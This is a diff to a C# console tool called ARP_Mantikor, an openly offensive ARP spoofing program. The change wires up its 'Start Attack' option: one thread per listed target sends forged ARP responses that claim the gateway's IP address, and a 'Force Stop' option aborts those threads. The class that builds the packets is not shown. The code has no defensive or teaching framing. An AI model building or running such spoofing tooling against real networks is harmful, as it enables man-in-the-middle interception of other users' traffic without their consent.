@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace ARP_Mantikor
 {
@@ -18,17 +19,16 @@ namespace ARP_Mantikor
         private static Host gateway = new Host();
 
         private static List<Host> targetList = new List<Host>();
+        private static List<Thread> threadList = new List<Thread>();
 
         static void Main(string[] args)
         {
             initializeConsole();
-            configureSourceAndGateway();
-            Console.Read();     //TODO => Delete this when finish
         }
-        
+
         private static void printPage()
         {
-            Console.Clear(); 
+            Console.Clear();
 
             string logo = @"
 ░█▀▄▀█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ▀█▀ ░█─▄▀ ░█▀▀▀█ ░█▀▀█ 
@@ -45,8 +45,9 @@ namespace ARP_Mantikor
             Console.WriteLine("Main Menu - Use the Numbers to navigate!");
             Console.WriteLine("[1] Configure Network Adapter => {0}", localHwAddress);
             Console.WriteLine("[2] Set Source & Gateway => {0} & {1}", source.ipAddress.ToString(), gateway.ipAddress.ToString());
-            Console.WriteLine("[3] Edit Target-List : Targets => {0}", targetList.Count);
-            Console.WriteLine("[5] Start Attack\n");
+            Console.WriteLine("[3] Edit Target-List : Targets => {0}\n", targetList.Count);
+            Console.WriteLine("[5] Start Attack : Open Threads => {0}", threadList.Count);
+            Console.WriteLine("[6] Force Stop\n");
         }
 
         private static void initializeConsole()
@@ -72,6 +73,9 @@ namespace ARP_Mantikor
                         break;
                     case "5":
                         startAttack();
+                        break;
+                    case "6":
+                        forceStop();
                         break;
                     default:
                         break;
@@ -137,14 +141,30 @@ namespace ARP_Mantikor
 
         private static void startAttack()
         {
+            ARP arp = new ARP();
+
             if (captureDevice != null)
             {
+                foreach (Host target in targetList)
+                {
+                    Thread thread = new Thread(() => arp.threadMethodeArpResponse(target.ipAddress, gateway.ipAddress, target.hwAddress, 50, captureDevice));
+                    thread.Start();
 
+                    threadList.Add(thread);
+                }
             }
             else
             {
                 Console.WriteLine("Network Adapter is not configured!");
                 Console.Read();
+            }
+        }
+
+        private static void forceStop()
+        {
+            foreach (Thread item in threadList)
+            {
+                item.Abort();
             }
         }
 
@@ -156,7 +176,7 @@ namespace ARP_Mantikor
             {
                 IPAddress hostIPAddress = IPAddress.Parse(pIPAddress);
                 byte[] ab = new byte[6];
-                int len = ab.Length,r = SendARP((int)hostIPAddress.Address, 0, ab, ref len);
+                int len = ab.Length, r = SendARP((int)hostIPAddress.Address, 0, ab, ref len);
                 string tempHwAddress = BitConverter.ToString(ab, 0, 6);
                 if (tempHwAddress != "00-00-00-00-00-00")
                     hwAddress = tempHwAddress;
